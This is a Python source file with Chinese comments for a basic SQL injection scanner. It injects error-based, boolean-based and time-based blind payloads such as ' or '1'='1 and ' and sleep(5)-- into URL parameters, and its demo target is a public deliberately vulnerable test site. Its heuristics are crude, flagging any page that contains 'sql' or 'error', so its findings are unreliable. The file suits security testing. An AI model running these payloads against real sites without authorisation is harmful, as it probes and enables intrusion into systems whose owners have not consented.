#!/usr/bin/env python3
"""
SQL注入检测模块 - 基于时间和布尔的盲注检测
"""

import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, Style


def test_payload(url, param, payload, original_content_length=None):
    """测试单个payload"""
    # 解析URL
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query, keep_blank_values=True)

    # 注入payload
    if param in query_params:
        query_params[param] = [payload]
    else:
        query_params[param] = payload

    new_query = urlencode(query_params, doseq=True)
    new_url = urlunparse(parsed._replace(query=new_query))

    try:
        start_time = time.time()
        resp = requests.get(new_url, timeout=10)
        elapsed_time = time.time() - start_time

        # 时间盲注检测（如果payload包含sleep）
        if 'sleep' in payload.lower():
            if elapsed_time > 4:
                return True, 'time_based'

        # 布尔盲注检测
        if original_content_length:
            if abs(len(resp.text) - original_content_length) > 50:
                return True, 'boolean_based'

        # 报错注入检测
        if 'error' in resp.text.lower() or 'mysql' in resp.text.lower() or 'sql' in resp.text.lower():
            return True, 'error_based'

    except:
        pass

    return False, None


def scan(url, param=None):
    """
    SQL注入检测主函数
    url: 目标URL
    param: 指定参数名（可选）
    """
    print(f"\n[*] 目标URL: {url}")

    # 解析URL获取参数
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query, keep_blank_values=True)

    if not query_params and not param:
        print(f"{Fore.RED}[!] URL没有参数，请指定参数名{Style.RESET_ALL}")
        return []

    # 确定要测试的参数
    if param:
        test_params = [param]
    else:
        test_params = list(query_params.keys())

    print(f"[*] 测试参数: {test_params}")

    results = []

    # 获取原始响应长度（用于布尔盲注）
    try:
        orig_resp = requests.get(url, timeout=10)
        orig_length = len(orig_resp.text)
    except:
        orig_length = None

    # 测试payloads
    payloads = [
        ("'", "error_based"),
        ("' or '1'='1", "boolean_based"),
        ("' or '1'='2", "boolean_based"),
        ("' and sleep(5)--", "time_based"),
        ("1' and sleep(5)--", "time_based"),
        ("' or sleep(5)--", "time_based"),
        ("1' and 1=1--", "boolean_based"),
        ("1' and 1=2--", "boolean_based"),
    ]

    for param_name in test_params:
        print(f"\n[*] 测试参数: {param_name}")

        for payload, vuln_type in payloads:
            is_vuln, found_type = test_payload(url, param_name, payload, orig_length)

            if is_vuln:
                result = {
                    'parameter': param_name,
                    'payload': payload,
                    'type': found_type or vuln_type,
                    'url': url
                }
                results.append(result)
                print(f"{Fore.RED}[!] 发现SQL注入漏洞！{Style.RESET_ALL}")
                print(f"    参数: {param_name}")
                print(f"    Payload: {payload}")
                print(f"    类型: {found_type or vuln_type}")
                break  # 找到一个就停止测试该参数

    return results


if __name__ == '__main__':
    # 测试代码
    results = scan('http://testphp.vulnweb.com/artists.php?artist=1')
    print(f"\n[*] 共发现 {len(results)} 个SQL注入漏洞")